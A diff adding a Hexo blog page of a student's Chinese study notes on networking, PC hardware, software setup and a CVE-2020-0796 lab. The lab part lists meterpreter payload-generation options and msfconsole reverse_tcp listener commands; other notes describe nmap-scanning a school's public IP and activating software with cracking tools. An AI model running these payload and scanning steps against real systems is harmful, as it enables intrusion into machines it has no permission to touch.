@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-7.10" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/07/10/7.10/" class="article-date">
+  <time class="dt-published" datetime="2024-07-10T06:52:11.808Z" itemprop="datePublished">2024-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h1><h2 id="1、两条计算机两条网线直接连接，需要手动设置"><a href="#1、两条计算机两条网线直接连接，需要手动设置" class="headerlink" title="1、两条计算机两条网线直接连接，需要手动设置"></a>1、两条计算机两条网线直接连接，需要手动设置</h2><h2 id="2、同一局域网相互访问"><a href="#2、同一局域网相互访问" class="headerlink" title="2、同一局域网相互访问"></a>2、同一局域网相互访问</h2><h2 id="3、接入因特网下载"><a href="#3、接入因特网下载" class="headerlink" title="3、接入因特网下载"></a>3、接入因特网下载</h2><p>每经过一个路由器为一跳，手机热点看作一个路由器<br>![[Pasted image 20240710091830.png]]</p>
+<p><strong>IP地址</strong>：网络中的一节点（255.255.255.255-0.0.0.0）<br>IPv4 2^32<br>公网IP需要几万获得<br>IPv6 2^128<br>手机卡（物联网卡）<br>路由器，交换机，定位<br>xxxxx.com  -&gt;  http:&#x2F;&#x2F;[xxxxxxxxxxx]:80</p>
+<p>255.255.255.255<br>A      B     C    D（扫描C段是指不动C段扫D段）<br>![[Pasted image 20240710093901.png]]<br>内网IP -NAT-公网IP<br>![[Pasted image 20240710094920.png]]<br>#子网掩码：前8位唯一&#x2F;前24位唯一等<br>#端口号：1-65535<br>#一个服务对应一个端口，每个协议有对应端口号<br>#指纹：每个框架所用的技术</p>
+<h1 id="通过hfs在同一局域网中通过内网ip传输文件"><a href="#通过hfs在同一局域网中通过内网ip传输文件" class="headerlink" title="通过hfs在同一局域网中通过内网ip传输文件"></a>通过hfs在同一局域网中通过内网ip传输文件</h1><p>桥接与主机平起平坐，互相独立，无线网用无线网卡 有线用有线。<br>nat是通过主机身份发送请求。<br>![[Pasted image 20240710104038.png]]</p>
+<h1 id="nmap的使用"><a href="#nmap的使用" class="headerlink" title="nmap的使用"></a>nmap的使用</h1><p>nmap+-p+端口号+IP<br>![[Pasted image 20240710114023.png]]<br>获取学校公网IP，可访问<br>nmap扫描学校IP，查看服务端口（80tcp）<br>![[Pasted image 20240710114243.png]]</p>
+<h1 id="博客的搭建"><a href="#博客的搭建" class="headerlink" title="博客的搭建"></a>博客的搭建</h1><p>github注册，免费博客<br>1、安装node与git<br>2、在目标文件夹中输入以下命令<br>（1）安装hexo（2）创建文件夹（3）进入文件夹（4）编译<br>![[Pasted image 20240710142236.png]]![[Pasted image 20240710142731.png]]<br>#白色文件 #蓝色目录<br>（1）新建文章（2）构建（3）自动服务<br>生成访问端口<br>![[Pasted image 20240710144009.png]]</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/07/10/7.10/" data-id="clyfhfvcs00021ott5x6g23zt" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-7.9" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/07/10/7.9/" class="article-date">
+  <time class="dt-published" datetime="2024-07-10T06:52:11.796Z" itemprop="datePublished">2024-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="电脑的选择"><a href="#电脑的选择" class="headerlink" title="电脑的选择"></a>电脑的选择</h1><p>1、笔记本<br>2、台式机<br>性价比转化率&#x3D;0.6 （台式6k&#x3D;笔记本1w）<br>品牌：联想 华硕 华为 小米 火影 七彩虹<br>主要不同在于：售后服务<br><strong>主板</strong>：<br>决定有多少usb接口，雷电4&#x3D;usb3.2&gt;usb3.1&gt;usb3.0。建议最少3个，优选4个<br>2. 看有多少m.2硬盘位(3个会很舒服)(预装硬盘没必要，溢价太严重了，京东2t固态7000的才1k多)<br>3. 看散热，看看就行了，毕竟<br>4. 不建议水冷笔记本<br><strong>显卡</strong>：<br>N卡稳定<br>A卡更便宜<br><strong>CPU</strong>：<br>优先I卡，i7性价比高<br>i3 i5 i7后面数字是指损毁率，越高损毁率低<br><strong>硬盘</strong>：<br>建议1T和4T，性价比高<br><strong>内存条</strong>：<br>包括8 16 32 64 96 128<br>看主频率DDR（CPU决定上限）</p>
+<p>硬件-驱动-系统-用户<br>window版本 家庭 专业  企业 专业工作站 教育<br>服务器版本   2003 2008 2012 2018<br>![[Pasted image 20240709110133.png]]</p>
+<h1 id="永恒之黑的漏洞CVE-2020-0796"><a href="#永恒之黑的漏洞CVE-2020-0796" class="headerlink" title="永恒之黑的漏洞CVE-2020-0796"></a>永恒之黑的漏洞CVE-2020-0796</h1><p>#github全球最大的代码开源网站<br>github上下载相关代码<br>复制粘贴放到kali中<br>kali与win10开启NAT模式<br>关闭win10hei的杀毒（win防火墙和病毒保护），查找win10和kali的ip地址<br>#poc观点验证脚本<br>#exp漏洞验证脚本</p>
+<p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件![[Pasted image 20240709141955.png]]![[Pasted image 20240709143411.png]]![[<br>使用vim文本编辑器替换exp文件![[Pasted image 20240709142042.png]]![[Pasted image 20240709192451.png]]<br>kali开启监听:<br><code>msfconsole</code><br><code>use exploit/multi/handler</code><br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br><code>show options</code><br><code>set lhost 192.168.20.128</code><br><code>set lport 5555</code><br><code>run</code><br>在kali中以终端打开，输入python+加工具名+IP地址，触发漏洞<br>制造木马-监听-触发<br>蓝屏说明攻击生效，但成功概率较低<br>![[Pasted image 20240709155358.png]]</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/07/10/7.9/" data-id="clyfhfvcp00001ottc0ckczjv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-7.8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/07/10/7.8/" class="article-date">
+  <time class="dt-published" datetime="2024-07-10T06:52:11.795Z" itemprop="datePublished">2024-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>1、首先重装系统</strong><br>磁盘分区，安装驱动<br>激活系统(关闭杀毒-一键激活)</p>
+<blockquote>
+<p>[!NOTE]<br>编辑文本+语言环境&#x3D;ide<br>后端（用户看不到的）<br>C、C++<br>java<br>python<br>go<br>rust</p>
+</blockquote>
+<p><strong>2、学习安装软件包括</strong><br>python（电脑-管理-高级系统设置-环境变量-系统变量（优先级低）Path设置python目录，script）<br>idea（选择路径安装idea，全勾）<br>Vmware（使用破解工具输入激活码激活）<br>Navicat<br>php</p>
+<blockquote>
+<p>[!NOTE]</p>
+<ol>
+<li>安装路径下无中文 </li>
+<li>最好不装在C盘</li>
+<li>安装路径不要有空格和符号(_除外)</li>
+</ol>
+</blockquote>
+<p><strong>3、安装vscode</strong><br>安装以下插件<br>[[Pasted image 20240708155002.png]]<br>codeium 使用代理在官网注册账号后使用<br>code runner 选择识别语言才能运行代码<br>edge插件#### SwitchyOmega（foxy已淘汰且影响圈）<br>在同一WLAN，监听转发代理服务器请求<br>ctrl加滚轮键放大字体</p>
+<p><strong>4.、安装Kali</strong><br>win10<br>作为靶机与攻击机</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/07/10/7.8/" data-id="clyfhfvcs00011ottakxketkf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-test1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/07/10/test1/" class="article-date">
+  <time class="dt-published" datetime="2024-07-10T06:37:53.000Z" itemprop="datePublished">2024-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/07/10/test1/">test1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h1>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/07/10/test1/" data-id="clyfgz51s0000y0tt83dj26wj" data-title="test1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/07/10/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2024-07-10T06:21:00.770Z" itemprop="datePublished">2024-07-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/07/10/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/07/10/hello-world/" data-id="clyfgjidz0000o8tt00cd8ts7" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/07/10/7.10/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/10/7.9/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/10/7.8/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/10/test1/">test1</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/10/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
